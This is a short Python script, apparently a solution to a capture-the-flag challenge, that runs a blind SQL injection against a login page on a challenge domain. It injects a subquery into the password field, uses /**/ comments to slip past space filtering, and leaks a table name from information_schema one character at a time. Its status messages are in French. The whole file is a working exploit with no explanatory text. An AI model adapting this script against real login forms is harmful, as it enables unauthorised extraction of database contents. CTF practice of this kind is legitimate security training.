#!/usr/bin/env python3

import pwn
import string
import requests
import time

table_name = ""
alphabet = string.printable
url = "https://secureblog.challenge.operation-kernel.fr/v3/login.php"
seek = True
pwn.log.progress("Can i found it ?")
while seek:
    loop = 0
    for car in alphabet:
        req = {
            "username": "demo", "password": "demo and (SELECT hex(substr(table_name,{},1)) FROM information_schema.tables limit 1 offset 1) = hex('{}')".format(
                len(table_name) + 1, car
            ).replace(" ", "/**/")
        }

        start = time.time()
        x = requests.post(url, data=req)
        end = time.time()
        print("{} : {}".format(car,end-start))

        if str("demo") in x.text:
            table_name += car
            pwn.warn(
                "Le caractère {} est le bon, il est ajouté à data_leak : {}".format(
                    car, table_name
                )
            )
            x.close()
            loop += 1
            break
        loop += 1
        x.close()
        if loop == len(string.printable):
            if not table_name:
                pwn.warn("Aucune information n'a été leakée")
                seek = False
            else:
                pwn.success("L'information leakée est : {}".format(table_name))
                seek = False
        else:
            continue
